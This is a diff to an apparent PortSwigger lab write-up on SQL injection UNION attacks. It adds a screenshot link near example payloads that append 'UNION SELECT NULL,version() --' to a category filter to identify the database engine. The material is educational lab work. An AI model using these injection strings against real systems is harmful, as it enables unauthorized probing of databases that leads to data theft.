@@ -86,17 +86,13 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,@@versio
 
 > NOTE - Syntax for findng version is the same for both Microsoft and MYSQL
 
-
-
 **PostgreSQL**
-
-
 
 ```sql
 SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,version() --
 ```
 
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/90beb6f4e3f3e89929c8bdbb57fe38a76480caca/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/PostgreSQL%20Database%20Confirmed.png)
 
 We can confirm that this is an POSTgreSQL db in backend.
 
